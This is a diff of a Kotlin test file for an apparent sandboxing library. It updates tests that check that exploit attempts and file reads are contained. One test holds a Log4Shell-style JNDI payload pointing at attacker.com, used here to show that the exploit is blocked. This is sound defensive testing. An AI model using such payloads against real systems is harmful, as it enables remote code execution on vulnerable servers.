@@ -4,7 +4,9 @@ import io.mazewall.LinuxNative
 import io.mazewall.Policy
 import io.mazewall.core.Arch
 import io.mazewall.enforcer.api.ContainedExecutors
+import io.mazewall.enforcer.api.ContainmentViolationEvidence
 import io.mazewall.enforcer.api.ContainmentViolationException
+import io.mazewall.enforcer.diagnostics.ContainmentViolationDetector
 import io.mazewall.ffi.NativeConstants
 import io.mazewall.ffi.memory.ConfinedSegment
 import org.junit.jupiter.api.Test
@@ -29,14 +31,12 @@ class ProtectionDemonstrationTest {
 
         val payload = "\${jndi:ldap://attacker.com/Exploit?cmd=touch,/tmp/pwned_safe}"
 
-        val ex =
-            assertFailsWith<ContainmentViolationException> {
-                SafeRunner.run(payload)
-            }
+        val ex = assertFailsWith<ContainmentViolationException> { SafeRunner.run(payload) }
 
-        assertTrue(
-            ex.message!!.contains("containment", ignoreCase = true),
-            "Expected containment violation message, got: ${ex.message}",
+        assertEquals(
+            ContainmentViolationEvidence.INFERRED_PERMISSION_FAILURE,
+            ContainmentViolationDetector.diagnose(ex)?.evidence,
+            "Expected an inferred permission failure, got: ${ex.cause}",
         )
 
         assertFalse(marker.exists(), "Exploit marker should NOT exist")
@@ -135,10 +135,7 @@ class ProtectionDemonstrationTest {
                         }
                     }.get()
             }.let { e ->
-                assertTrue(
-                    e.cause is ContainmentViolationException,
-                    "Expected ContainmentViolationException as cause, but got ${e.cause}",
-                )
+                assertEquals(ContainmentViolationEvidence.INFERRED_PERMISSION_FAILURE, ContainmentViolationDetector.diagnose(e)?.evidence)
             }
         } finally {
             safeExecutor.shutdown()
@@ -163,10 +160,7 @@ class ProtectionDemonstrationTest {
                         File("/etc/hosts").readText()
                     }.get()
             }.let { e ->
-                assertTrue(
-                    e.cause is ContainmentViolationException,
-                    "Expected ContainmentViolationException as cause, but got ${e.cause}",
-                )
+                assertEquals(ContainmentViolationEvidence.INFERRED_PERMISSION_FAILURE, ContainmentViolationDetector.diagnose(e)?.evidence)
             }
         } finally {
             safeExecutor.shutdown()
